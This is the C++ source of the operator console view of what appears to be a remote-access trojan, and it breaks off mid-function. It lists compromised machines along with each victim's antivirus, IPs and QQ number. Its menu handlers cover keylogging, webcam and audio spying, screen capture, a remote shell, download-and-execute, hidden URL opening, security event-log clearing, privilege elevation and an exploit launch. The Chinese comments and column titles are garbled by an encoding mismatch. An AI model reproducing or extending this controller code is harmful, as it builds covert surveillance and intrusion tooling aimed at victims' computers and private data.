// ClientView.cpp : implementation of the CClientView class
//

#include "stdafx.h"
#include "Client.h"
#include "ClientDoc.h"
#include "ClientView.h"
#include "MainFrm.h"
#include "TabView.h"
#include "ChangeGroup.h"
#include "FileManagerDlg.h"
#include "ScreenSpyDlg.h"
#include "WebCamDlg.h"
#include "AudioDlg.h"
#include "KeyBoardDlg.h"
#include "SystemDlg.h"
#include "ShellDlg.h"
#include "SysInfo.h"
#include "MsgBox.h"
#include "InputDlg.h"
#include "RegDlg.h"
#include "LogView.h"
#include "Chat.h"
#include "QQInfoDlg.h"
#include "SerManager.h"
#include "MapDlg.h"
#include "Play.h"
#include "Start.h"
#include "LogView.h"
#include "DllDlg.h"	
#include "ProxyMapDlg.h"
#include <mmsystem.h>  //��������ͷ�ļ�
#pragma comment(lib,"winmm.lib") //��������ͷ�ļ���

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

extern CClientView* g_pConnectView;
extern CTabView* g_pTabView;
extern CMainFrame* g_pFrame;
extern CLogView* g_pLogView;

#define IDC_TABCONTROL 100

typedef struct
{
	char	*title;
	int		nWidth;
}LISTHEAD;

LISTHEAD g_Column_Data[] = 
{
	{_T("����/����"),			150	},//0
	{_T("����"),		        65	},//1
	{_T("�ɻ�/ɱ��"),	        150 },//2
	{_T("����IP"),			    160	},//3
	{_T("����IP"),			    160	},//4
	{_T("����QQ"),		        100	},//5
	{_T("����ϵͳ"),			150	},//6
	{_T("�û�״̬"),		    120	},//7
	{_T("������"),              95	},//8
	{_T("�����ӳ�"),		    0	},//9
	{_T("�������/��ע"),      	150	},//10Ӳ��/�ڴ�
	{_T("Ӳ��/�ڴ�"),	        150	},//11�������/��ע
	{_T("����"),		        0   },//12
	{_T("��Ƶ"),			    0	},//13
	{_T("ɸѡ"),			    0	},//14
	{_T("�汾"),			    80	},//15
	{_T("��װʱ��(����ʱ��)"),	140	},//16
	{_T("����ʱ��"),	    	120	},//17
	{_T("���ӷ�ʽ"),		    0   },//18
};

int g_Column_DaWid[30]={0};
int g_Column_Width = 0;
int	g_Column_Count = (sizeof(g_Column_Data) / 8);
/////////////////////////////////////////////////////////////////////////////
// CClientView

IMPLEMENT_DYNCREATE(CClientView, CListView)

BEGIN_MESSAGE_MAP(CClientView, CListView)
//{{AFX_MSG_MAP(CClientView)
ON_WM_SIZE()
ON_WM_RBUTTONDOWN()
ON_WM_LBUTTONDBLCLK()
ON_NOTIFY_REFLECT(NM_CUSTOMDRAW, OnCustomDraw)
ON_COMMAND(IDM_FILEMANAGER, OnFileManager)
ON_COMMAND(IDM_SCREENSPY, OnScreenspy)
ON_COMMAND(IDM_DOWNEXEC, OnDownExec)
ON_COMMAND(IDM_WEBCAM, OnWebcam)
ON_COMMAND(IDM_RESTART, OnReStart)
ON_COMMAND(IDM_REMOVE, OnRemove)
ON_COMMAND(IDM_KEYBOARD, OnKeyboard)
ON_COMMAND(IDM_SYSTEM, OnSystem)
ON_COMMAND(IDM_REMOTESHELL, OnRemoteShell)
ON_COMMAND(IDM_LOGOFF, OnLogoff)
ON_COMMAND(IDM_REBOOT, OnReboot)
ON_COMMAND(IDM_SHUTDOWN, OnShutdown)
ON_COMMAND(IDM_SELECT_ALL, OnSelectAll)
ON_COMMAND(IDM_UNSELECT_ALL, OnUnselectAll)
ON_COMMAND(IDM_OPEN_URL_HIDE, OnOpenUrlHide)
ON_COMMAND(IDM_OPEN_URL_SHOW, OnOpenUrlShow)
/////////////////////////////////////
ON_COMMAND(IDM_CLEANEVENT, OnCleanEvent)
ON_COMMAND(IDM_CLEAN_System, OnCleanSystem)
ON_COMMAND(IDM_CLEAN_Security, OnCleanSecurity)
ON_COMMAND(IDM_CLEAN_Application, OnCleanApplication)
/////////////////////////////////////////
ON_COMMAND(IDM_RENAME_REMARK, OnRenameRemark)
ON_COMMAND(IDM_AUDIO_LISTEN, OnAudioListen)
ON_COMMAND(IDM_DISCONNECT, OnDisconnect)
ON_COMMAND(IDM_SHOWMSG, OnShowMsg)
ON_COMMAND(IDM_CHANGEGROUP, OnChangeGroup)
ON_COMMAND(IDM_SYSINFO, OnSysinfo)
ON_COMMAND(IDM_REGEDIT, OnRegedit)
ON_COMMAND(IDM_SERMANAGER, OnSerManager)
ON_COMMAND(IDM_UPDATE_SERVER, OnUpdateServer)
//������Ϣ
ON_COMMAND(IDM_IPLIST, OnIPList)
ON_COMMAND(IDM_IP, OnIP)
ON_COMMAND(IDM_BEIZHU, OnBeiZhu)
ON_COMMAND(IDM_DILIXINXI, OnDiLiXinXi)
ON_COMMAND(IDM_ALL, OnAll)
//ɸѡ����
ON_COMMAND(IDM_FIND_PROCESS, OnSortProcess)
ON_COMMAND(IDM_FINDWINDOWS, OnSortWindow)
ON_COMMAND(ID_CHONGZHI, OnChongZhi)
//Զ�̽�̸
ON_COMMAND(IDM_CHAT, OnChat)
ON_COMMAND(IDM_QQINFO, OnQQInfo)
ON_COMMAND(IDM_MAP, OnMap)
ON_COMMAND(IDM_START_HIDE, OnStartHide) //��������
ON_COMMAND(IDM_START_SHOW, OnStartShow) //��������
//д������
ON_COMMAND(IDM_START, OnStart)
//WIN10����
ON_COMMAND(ID_Screen, OnScreen)
ON_COMMAND(ID_MENUITEM_PROXY_MAP, OnMenuitemProxyMap)
ON_COMMAND(IDM_Elevate_Privileges, OnElevate_Privileges)//WIN7����Ȩ��
ON_COMMAND(ID_EXP_ReStart, OnReStartexp)//����Exp
ON_COMMAND(ID_IEQC, OnIEQC)
//}}AFX_MSG_MAP
ON_MESSAGE(WM_ADDTOLIST, OnAddToList)
ON_MESSAGE(WM_REMOVEFROMLIST, OnRemoveFromList)
ON_MESSAGE(WM_OPENMANAGERDIALOG, OnOpenManagerDialog)
ON_MESSAGE(WM_OPENSCREENSPYDIALOG, OnOpenScreenSpyDialog)
ON_MESSAGE(WM_OPENWEBCAMDIALOG, OnOpenWebCamDialog)
ON_MESSAGE(WM_OPENAUDIODIALOG, OnOpenAudioDialog)
ON_MESSAGE(WM_OPENKEYBOARDDIALOG, OnOpenKeyBoardDialog)
ON_MESSAGE(WM_OPENSYSTEMDIALOG, OnOpenSystemDialog)
ON_MESSAGE(WM_OPENSHELLDIALOG, OnOpenShellDialog)
ON_MESSAGE(WM_OPENSYSINFODIALOG, OnOpenSysInfoDialog)
ON_MESSAGE(WM_OPENREGEDITDIALOG, OnOpenRegeditDialog)
ON_MESSAGE(WM_OPENCHATDIALOG, OnOpenChatDialog)
ON_MESSAGE(WM_OPENQQINFODIALOG, OnOpenQQInfoDialog)
ON_MESSAGE(WM_OPENPSERLISTDIALOG, OnOpenSerManagerDialog)
ON_MESSAGE(WM_OPENDLLDLG, OnOpenDllDialog)
ON_MESSAGE(WM_MODIFYLIST, OnModifyList)
ON_MESSAGE(WM_NOMODIFYLIST, OnNoModifyList)
ON_MESSAGE(WM_OPENPROXYMAPDIALOG, OnOpenProxyMapDialog)

END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CClientView construction/destruction

CClientView::CClientView()
{
	// TODO: add construction code here
	CountID = 0;
	
	m_AutoAttack = FALSE;
	
	((CClientApp *)AfxGetApp())->m_pConnectView = this;
	m_pListCtrl = NULL;
}

CClientView::~CClientView()
{
}

BOOL CClientView::PreCreateWindow(CREATESTRUCT& cs)
{
	// TODO: Modify the Window class or styles here by modifying
	//  the CREATESTRUCT cs
	cs.style |= LVS_REPORT;
	return CListView::PreCreateWindow(cs);
}

void CClientView::OnCustomDraw(NMHDR* pNMHDR, LRESULT* pResult)
{
	NMLVCUSTOMDRAW* pLVCD = (NMLVCUSTOMDRAW*)(pNMHDR);
	*pResult = CDRF_DODEFAULT;
	if (pLVCD->nmcd.dwDrawStage == CDDS_PREPAINT)
	{
		*pResult = CDRF_NOTIFYITEMDRAW;
	}
	else if (pLVCD->nmcd.dwDrawStage == CDDS_ITEMPREPAINT)
	{
// 		COLORREF clrText, crlTextBk;
// 		int nItem = static_cast<int>(pLVCD->nmcd.dwItemSpec);
// 		POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition();
// 		while (pos)
// 		{
// 			if (m_pListCtrl->GetNextSelectedItem(pos) == nItem)
// 			{
// 				clrText   =  RGB(255, 255, 255); //��ɫ
// 				crlTextBk =  RGB(51, 153, 255);  //��ɫ
// 				pLVCD->clrText = clrText;
// 				pLVCD->clrTextBk = crlTextBk;
// 			}
// 		}
// 		*pResult = CDRF_DODEFAULT;
		int nItem = static_cast<int> (pLVCD->nmcd.dwItemSpec); 	
		bool bDBImplFail = false;
		COLORREF   m_clrText; 
		if (((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "Color", true) == 0)//�������ж��Ƿ�����
		{ 
			m_clrText  =  RGB(255,97,0) ; // ��ɫ
		}
		
		if (((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "Color", true) == 1)//�������ж��Ƿ�����
		{ 
			m_clrText  =  RGB(0, 0, 0) ; // ��ɫ
		}
		
		if (((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "Color", true) == 2)//�������ж��Ƿ�����
		{ 
			m_clrText  =  RGB(255, 0, 0) ; // ��ɫ
		}
		
		if (((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "Color", true) == 3)//�������ж��Ƿ�����
		{ 
			m_clrText  =  RGB(0,0,255) ; // ��ɫ
		}
		
		if (((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "Color", true) == 4)//�������ж��Ƿ�����
		{ 
			m_clrText  =  RGB(160,32,240) ; // ��ɫ
		}
		
		pLVCD->clrText = m_clrText; 	
		*pResult = CDRF_DODEFAULT; 
	}
}

/////////////////////////////////////////////////////////////////////////////
// CClientView drawing

void CClientView::OnDraw(CDC* pDC)
{
	CDocument* pDoc = GetDocument();
	ASSERT_VALID(pDoc);
	// TODO: add draw code for native data here
}

typedef struct _MSGINFO {
	UINT msg;     
} MSGINFO;   

MSGINFO msgInfo[] = { 
	{IDI_ICON1 },{IDI_ICON2 },{IDI_ICON3 },{IDI_ICON4 },{IDI_ICON5 },
	{IDI_ICON6 },{IDI_ICON7 },{IDI_ICON8 },{IDI_ICON9 },{IDI_ICON10 },
	{IDI_ICON11 },{IDI_ICON12 },{IDI_ICON13 },{IDI_ICON14 },{IDI_ICON15 },
	{IDI_ICON16 },{IDI_ICON17 },{IDI_ICON18 },{IDI_ICON19 },{IDI_ICON20 },
	{IDI_ICON21 },{IDI_ICON22 },{IDI_ICON23 },{IDI_ICON24 },{IDI_ICON25 },
	{IDI_ICON26 },{IDI_ICON27 },{IDI_ICON28 },{IDI_ICON29 },{IDI_ICON30 },
	{IDI_ICON31 },{IDI_ICON32 },{IDI_ICON33 },{IDI_ICON34 },{IDI_ICON35 },
	{IDI_ICON36 },{IDI_ICON37 },{IDI_ICON38 },{IDI_ICON39 },{IDI_ICON40 },
	{IDI_ICON41 },{IDI_ICON42 },{IDI_ICON43 },{IDI_ICON44 },{IDI_ICON45 },
	{IDI_ICON46 },{IDI_ICON47 },{IDI_ICON48 },{IDI_ICON49 },{IDI_ICON50 },
	{IDI_ICON51 },{IDI_ICON52 },{IDI_ICON53 },{IDI_ICON54 },{IDI_ICON55 },
	{IDI_ICON56 },{IDI_ICON57 },{IDI_ICON58 },{IDI_ICON59 },{IDI_ICON60 },
	{IDI_ICON61 },{IDI_ICON62 },{IDI_ICON63 },{IDI_ICON64 },{IDI_ICON65 },
	{IDI_ICON66 },{IDI_ICON67 },{IDI_ICON68 },{IDI_ICON69 },{IDI_ICON70 },
	{IDI_ICON71 },{IDI_ICON72 },{IDI_ICON73 },{IDI_ICON74 },{IDI_ICON75 },
	{IDI_ICON76 },{IDI_ICON77 },{IDI_ICON78 },{IDI_ICON79 },{IDI_ICON80 },
	{IDI_ICON81 },{IDI_ICON82 },{IDI_ICON83 },{IDI_ICON84 },{IDI_ICON85 },
	{IDI_ICON86 },{IDI_ICON87 },{IDI_ICON88 },{IDI_ICON89 },{IDI_ICON90 },
	{IDI_ICON91 },{IDI_ICON92 },{IDI_ICON93 },{IDI_ICON94 },{IDI_ICON95 },
	{IDI_ICON96 },{IDI_ICON97 },{IDI_ICON98 },{IDI_ICON99 },{IDI_ICON100 },
	{IDI_ICON101 },{IDI_ICON102 },{IDI_ICON103 },{IDI_ICON104 },{IDI_ICON105 },
	{IDI_ICON106 },{IDI_ICON107 },{IDI_ICON108 },{IDI_ICON109 },{IDI_ICON110 },
	{IDI_ICON111 },{IDI_ICON112 },{IDI_ICON113 },{IDI_ICON114 },{IDI_ICON115 },
	{IDI_ICON116 },{IDI_ICON117 },{IDI_ICON118 },{IDI_ICON119 },{IDI_ICON120 },
	{IDI_ICON121 },{IDI_ICON122 },{IDI_ICON123 },{IDI_ICON124 },{IDI_ICON125 },
	{IDI_ICON126 },{IDI_ICON127 },{IDI_ICON128 },{IDI_ICON129 },{IDI_ICON130 },
	{IDI_ICON131 },{IDI_ICON132 },{IDI_ICON133 },{IDI_ICON134 },{IDI_ICON135 },
	{IDI_ICON136 },{IDI_ICON137 },{IDI_ICON138 },{IDI_ICON139 },{IDI_ICON140 },
	{IDI_ICON141 },{IDI_ICON142 },{IDI_ICON143 },{IDI_ICON144 },{IDI_ICON145 },
	{IDI_ICON146 },{IDI_ICON147 },{IDI_ICON148 },{IDI_ICON149 },{IDI_ICON150 },
	{IDI_ICON151 },{IDI_ICON152 },{IDI_ICON153 },{IDI_ICON154 },{IDI_ICON155 },
	{IDI_ICON156 },{IDI_ICON157 },{IDI_ICON158 },{IDI_ICON159 },{IDI_ICON160 },
	{IDI_ICON161 },{IDI_ICON162 },{IDI_ICON163 },{IDI_ICON164 },{IDI_ICON165 },
	{IDI_ICON166 },{IDI_ICON167 },{IDI_ICON168 },{IDI_ICON169 },{IDI_ICON170 },
	{IDI_ICON171 },{IDI_ICON172 },{IDI_ICON173 },{IDI_ICON174 },{IDI_ICON175 },
	{IDI_ICON176 },{IDI_ICON177 },{IDI_ICON178 },{IDI_ICON179 },{IDI_ICON180 },
	{IDI_ICON181 },{IDI_ICON182 },{IDI_ICON183 },{IDI_ICON184 },{IDI_ICON185 },
	{IDI_ICON186 },{IDI_ICON187 },{IDI_ICON188 },{IDI_ICON189 },{IDI_ICON190 },
	{IDI_ICON191 },{IDI_ICON192 },{IDI_ICON193 },{IDI_ICON194 },{IDI_ICON195 },
	{IDI_ICON196 },{IDI_ICON197 },{IDI_ICON198 },{IDI_ICON199 },{IDI_ICON200 },
	{IDI_ICON201 },{IDI_ICON202 },{IDI_ICON203 },{IDI_ICON204 },{IDI_ICON205 },
	{IDI_ICON206 },{IDI_ICON207 },{IDI_ICON208 }
}; 

void CClientView::OnInitialUpdate() 
{
	CListView::OnInitialUpdate();	
	// TODO: Add your specialized code here and/or call the base class
	
	if (((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "national", true) == 0)
	{
		m_pListCtrl = &GetListCtrl();
		I_ImageList.Create(20, 16, ILC_COLOR32,10, 0);
		HICON hIcon = NULL;//����Ϊ����3��ͼ����Դ
		hIcon = (HICON)::LoadImage(::AfxGetInstanceHandle(),MAKEINTRESOURCE(IDI_SHIPIN), IMAGE_ICON, 16, 16, 0);
		I_ImageList.Add(hIcon);
		hIcon = (HICON)::LoadImage(::AfxGetInstanceHandle(),MAKEINTRESOURCE(IDR_MAINFRAME), IMAGE_ICON, 16, 16, 0);
		I_ImageList.Add(hIcon);
		ListView_SetImageList(m_pListCtrl->m_hWnd,I_ImageList, LVSIL_SMALL);
	}
	else
	{
		m_pListCtrl = &GetListCtrl();
		I_ImageList.Create(20, 16, ILC_COLOR32|ILC_MASK,10, 0);
		HICON hIcon = NULL;	// ����Ϊ����ͼ����Դ		
		int Icot = sizeof(msgInfo)/sizeof(MSGINFO);
		for(int t=0; t<Icot; t++)
		{ 
			int Htms = msgInfo[t].msg;
			hIcon = (HICON)::LoadImage(::AfxGetInstanceHandle(),MAKEINTRESOURCE(Htms), IMAGE_ICON, 28, 14, 0);
			I_ImageList.Add(hIcon);
			DestroyIcon(hIcon); 
		}
		ListView_SetImageList(m_pListCtrl->m_hWnd,I_ImageList, LVSIL_SMALL);  //���õ��Ĳ���ϵͳ��ͼ���б�ؼ�����
	}
	
	//������
	if (((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "gridlines", false) == 0)
	{
// 		m_pListCtrl->SetExtendedStyle(/*LVIF_PARAM | */LVS_EX_FULLROWSELECT /*| LVS_EX_FLATSB*/ |       //�޸�ѡ��
// 			LVS_EX_ONECLICKACTIVATE | LVS_EX_UNDERLINEHOT |LVS_EX_SUBITEMIMAGES| LVS_EX_GRIDLINES);     //��������
		m_pListCtrl->SetExtendedStyle(LVIF_PARAM | LVS_EX_FULLROWSELECT /*| LVS_EX_FLATSB*/ |           //�и�ѡ��
			LVS_EX_ONECLICKACTIVATE | LVS_EX_UNDERLINEHOT |LVS_EX_SUBITEMIMAGES/*| LVS_EX_GRIDLINES*/); //��������
	}
	else
	{
// 		m_pListCtrl->SetExtendedStyle(/*LVIF_PARAM | */LVS_EX_FULLROWSELECT /*| LVS_EX_FLATSB*/ |   //�޸�ѡ��
// 			LVS_EX_ONECLICKACTIVATE | LVS_EX_UNDERLINEHOT |LVS_EX_SUBITEMIMAGES| LVS_EX_GRIDLINES); //��������
		m_pListCtrl->SetExtendedStyle(LVIF_PARAM | LVS_EX_FULLROWSELECT /*| LVS_EX_FLATSB*/ |       //�и�ѡ��
			LVS_EX_ONECLICKACTIVATE | LVS_EX_UNDERLINEHOT |LVS_EX_SUBITEMIMAGES| LVS_EX_GRIDLINES); //��������
	}
	
	operate = ((CClientApp *)AfxGetApp())->m_IniFile.GetDWORD("Settings", "operate", 3);
	if (operate<0 || operate>=12)
	{
		operate = 3;
	}
	
	// �ı���������������ɫ
//	m_pListCtrl->SetTextColor(RGB(240,0,150));  //�ۺ���ʾ
//	m_pListCtrl->SetTextColor(RGB(0,100,255));  //��ɫ��ʾ
//	m_pListCtrl->SetTextColor(RGB(160,32,240)); //��ɫ��ʾ
//	m_pListCtrl->SetTextColor(RGB(0,255,0));    //��ɫ��ʾ
//	m_pListCtrl->SetTextColor(RGB(255,0,255));  //��ۺ���ʾ
//	m_pListCtrl->SetTextColor(RGB(255,0,0));    //��ɫ��ʾ
//	m_pListCtrl->SetBkColor(RGB(0,0,0));        //���ñ���
	m_pListCtrl->SetTextBkColor(-1); 
	ChildNotifyWidth();
	
	if ( m_pListCtrl->GetHeaderCtrl()-> GetItemCount() > 0)
	{
		return;
	}
	
	g_Column_Width = 0;
	for (int i = 0; i < g_Column_Count; i++)
	{
		m_pListCtrl->InsertColumn(i, g_Column_Data[i].title);
		m_pListCtrl->SetColumnWidth(i, g_Column_DaWid[i]);
		g_Column_Width += g_Column_DaWid[i]; // �ܿ��
	}
	HWND hWndHeader = m_pListCtrl->GetDlgItem(0)->GetSafeHwnd();
	m_header.SubclassWindow(hWndHeader);
//	m_header.SetTheme(new CXTHeaderCtrlThemeOffice2003());
}

void CClientView::ChildNotifyWidth()
{
	BOOL DaWids[30]={0};
	DaWids[0] = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "Width01", TRUE);
	DaWids[1] = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "Width02", TRUE);
	DaWids[2] = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "Width03", TRUE);
	DaWids[3] = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "Width04", FALSE);
	DaWids[4] = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "Width05", TRUE);
	DaWids[5] = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "Width06", TRUE);
	DaWids[6] = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "Width07", TRUE);
	DaWids[7] = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "Width08", TRUE);
	DaWids[8] = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "Width09", FALSE);
	DaWids[9] = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "Width10", TRUE);
	DaWids[10] = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "Width11", TRUE);
	DaWids[11] = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "Width12", FALSE);
	DaWids[12] = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "Width13", FALSE);
	DaWids[13] = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "Width14", TRUE);
	DaWids[14] = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "Width15", TRUE);
	DaWids[15] = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "Width16", FALSE);
	DaWids[16] = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "Width17", TRUE);
	DaWids[17] = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "Width18", TRUE);
	DaWids[18] = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "Width19", FALSE);
	
	for (int i = 0; i < g_Column_Count; i++)
	{
		if(i==g_Column_Count)
			g_Column_DaWid[i] = 0;  //����Ƿ��� ʼ�ձ���Ϊ��
		else
		{
			if(DaWids[i])
				g_Column_DaWid[i] = g_Column_Data[i].nWidth;
			else
				g_Column_DaWid[i] = 0;
		}
	}
}

void CClientView::NewInitialUpdate()
{
	OnInitialUpdate();
}

/////////////////////////////////////////////////////////////////////////////
// CClientView diagnostics

#ifdef _DEBUG
void CClientView::AssertValid() const
{
	CListView::AssertValid();
}

void CClientView::Dump(CDumpContext& dc) const
{	
	ASSERT(m_pDocument->IsKindOf(RUNTIME_CLASS(CClientDoc)));
	CListView::Dump(dc);
}
#endif //_DEBUG

/////////////////////////////////////////////////////////////////////////////
// CClientView message handlers
void CClientView::OnSize(UINT nType, int cx, int cy) 
{
	CListView::OnSize(nType, cx, cy);
	
	// TODO: Add your message handler code here
	if (m_pListCtrl == NULL)
		return;
	if (m_pListCtrl->m_hWnd!=NULL)
	{
		if (m_pListCtrl != NULL)
		{
			int i;
			int str_cx [60] ={0};
			double dcx=(double)cx/g_Column_Width; 
			for(i=0;i<g_Column_Count;i++)
			{
				double dd=g_Column_DaWid[i];          //�õ���ǰ�еĿ��
				dd = dd*dcx;
				str_cx[i] = (int)dd;
			}
			
			m_pListCtrl->LockWindowUpdate();
			for(i=0;i<g_Column_Count;i++)
			{
				m_pListCtrl->SetColumnWidth(i,str_cx[i]);       //���õ�ǰ�Ŀ��
			}
			m_pListCtrl->UnlockWindowUpdate(); 
		}
	}
}

void CClientView::SortColumn(int iCol, bool bAsc)
{
	m_bAscending = bAsc;
	m_nSortedCol = iCol;
	
	// set sort image for header and sort column.
	//	m_listCtrl.SetSortImage(m_nSortedCol, m_bAscending);
	CXTPSortClass csc(m_pListCtrl, m_nSortedCol);
	csc.Sort(m_bAscending, xtpSortString);
}

BOOL CClientView::OnNotify(WPARAM wParam, LPARAM lParam, LRESULT* pResult) 
{
	// TODO: Add your specialized code here and/or call the base class
	HD_NOTIFY *pHDNotify = (HD_NOTIFY*)lParam;
	if (pHDNotify->hdr.code == HDN_ITEMCLICKA || pHDNotify->hdr.code == HDN_ITEMCLICKW)
	{
		SortColumn(pHDNotify->iItem, !m_bAscending);
	}
	return CListView::OnNotify(wParam, lParam, pResult);
}

void CClientView::EnableControls(BOOL bRedraw)
{
	XTOSVersionInfo()->IsWinXPOrGreater();
	XTOSVersionInfo()->IsWinXPOrGreater();
	
	if (bRedraw)
	{
		RedrawWindow(NULL, NULL, RDW_INVALIDATE|RDW_UPDATENOW|RDW_ERASE|RDW_ALLCHILDREN);
	}
}

void CClientView::ModifyDrawStyle(UINT uFlag, BOOL bRemove)
{
	CXTHeaderCtrlTheme* pTheme = m_header.GetTheme();
	if (pTheme)
	{
		DWORD dwStyle = pTheme->GetDrawStyle() & ~uFlag;
		
		if (bRemove)
			dwStyle |= uFlag;
		
		pTheme->SetDrawStyle(dwStyle, &m_header);
		m_header.RedrawWindow();
	}
}

void CClientView::OnRButtonDown(UINT nFlags, CPoint point) 
{
	// TODO: Add your message handler code here and/or call default
	CListView::OnRButtonDown(nFlags, point);
	CMenu	popup;
	popup.LoadMenu(IDR_LIST);
	CMenu*	pM = popup.GetSubMenu(0);
	CPoint	p;
	GetCursorPos(&p);
	int	count = pM->GetMenuItemCount();
	// 	pM->TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this);
	
	CXTPCommandBars::TrackPopupMenu(pM, TPM_RIGHTBUTTON,p.x, p.y, AfxGetMainWnd(), 0, 0, 
		((CXTPFrameWnd*)AfxGetMainWnd())->GetCommandBars());	
}

LRESULT CClientView::OnAddToList(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	
	if (pContext == NULL)
		return -1;
	
	CString	strToolTipsText, strOS, strLogText;
	try
	{
		int nCnt = m_pListCtrl->GetItemCount();
		
		// ���Ϸ������ݰ�
		if (pContext->m_DeCompressionBuffer.GetBufferLen() != sizeof(LOGININFO))
			return -1;
		
		LOGININFO*	LoginInfo = (LOGININFO*)pContext->m_DeCompressionBuffer.GetBuffer();
		
		// ID
		CString	str, WanIPAddress, LanIPAddress;		
		int i = 0;
		
		// ����IP
		sockaddr_in  sockAddr;
		memset(&sockAddr, 0, sizeof(sockAddr));
		int nSockAddrLen = sizeof(sockAddr);
		BOOL bResult = getpeername(pContext->m_Socket,(SOCKADDR*)&sockAddr, &nSockAddrLen);
		if (LoginInfo->WanIPAddress.S_un.S_addr == 0)
			WanIPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";
		else
			WanIPAddress = inet_ntoa(LoginInfo->WanIPAddress);
		
		// ����
		str = ((CClientApp *)AfxGetApp())->m_SeuQQwry.IPtoAddr(WanIPAddress);
		int countryno=FindCountry(str);
		i = m_pListCtrl->InsertItem(nCnt, str, countryno);//ʹ��ָ��ͼ��
		m_pListCtrl->SetItemText(i, 0, str);
		
		// ��������
		LanIPAddress = inet_ntoa(LoginInfo->LanIPAddress);
		if (WanIPAddress == LanIPAddress)
			str = "����";
		else
			str = "����";
		m_pListCtrl->SetItemText(i, 1, str);

		// ɱ�����
		str.Format(" %s", LoginInfo->Virus);
		m_pListCtrl->SetItemText(i, 2, str);
		
		// ����IP
		m_pListCtrl->SetItemText(i, 3, WanIPAddress);
		
		// ����IP
		m_pListCtrl->SetItemText(i, 4, LanIPAddress);

		// ����QQ
		str.Format(_T("%s"), LoginInfo->szQQNum );
		m_pListCtrl->SetItemText(i, 5, str);
		
		////////////////////////////////////////////////////////////////////////////////////////
		// ����ϵͳ
		char *pszOS = NULL;
		switch (LoginInfo->OsVerInfoEx.dwPlatformId)
		{
		case VER_PLATFORM_WIN32_NT:
			if ( LoginInfo->OsVerInfoEx.dwMajorVersion <= 4 )
			{
				pszOS = _T("NT");
				g_pFrame->nOSCount[0]++;
			}
			else if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 5 && LoginInfo->OsVerInfoEx.dwMinorVersion == 0 )
			{
				pszOS = _T("2000");
				g_pFrame->nOSCount[1]++;
			}
			else if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 5 && LoginInfo->OsVerInfoEx.dwMinorVersion == 1 )
			{
				pszOS = _T("XP");
				g_pFrame->nOSCount[2]++;
			}
			else if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 5 && LoginInfo->OsVerInfoEx.dwMinorVersion == 2 )
			{
				pszOS = _T("2003");
				g_pFrame->nOSCount[3]++;
			}
			else if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 0 )
			{
				if(LoginInfo->OsVerInfoEx.wProductType == VER_NT_WORKSTATION)
				{
					pszOS = _T("Vista"); 
					g_pFrame->nOSCount[4]++;
				}
				else
				{
					pszOS = _T("2008");
					g_pFrame->nOSCount[5]++;
				}
			}
			else if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 1 )
			{
				if(LoginInfo->OsVerInfoEx.wProductType == VER_NT_WORKSTATION)
				{
					pszOS = _T("Win7");
					g_pFrame->nOSCount[6]++;
				}
				else
				{
					pszOS = _T("2008R2");
					g_pFrame->nOSCount[5]++;
				}
			}
			else if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 2 )
			{
				if(LoginInfo->OsVerInfoEx.wProductType == VER_NT_WORKSTATION)
				{
					pszOS = _T("Win8");
					g_pFrame->nOSCount[7]++;
				}
				else
				{
					pszOS = _T("2012");
					g_pFrame->nOSCount[8]++;
				}
			}
			else if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 3 )
			{
				if(LoginInfo->OsVerInfoEx.wProductType == VER_NT_WORKSTATION)
				{
					pszOS = _T("Win8.1");
					g_pFrame->nOSCount[7]++;
				}
				else
				{
					pszOS = _T("2012R2");
					g_pFrame->nOSCount[8]++;
				}
			}
			else if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 10 && LoginInfo->OsVerInfoEx.dwMinorVersion == 0 )
			{
				if(LoginInfo->OsVerInfoEx.wProductType == VER_NT_WORKSTATION)
				{
					pszOS = _T("Win10");
					g_pFrame->nOSCount[9]++;
				}
				else
				{
					pszOS = _T("2016");
					g_pFrame->nOSCount[10]++;
				}
			}
		}	
		
		CString OSNumber;
		if (LoginInfo->bIs64) // ƽ̨
			OSNumber = _T("64");
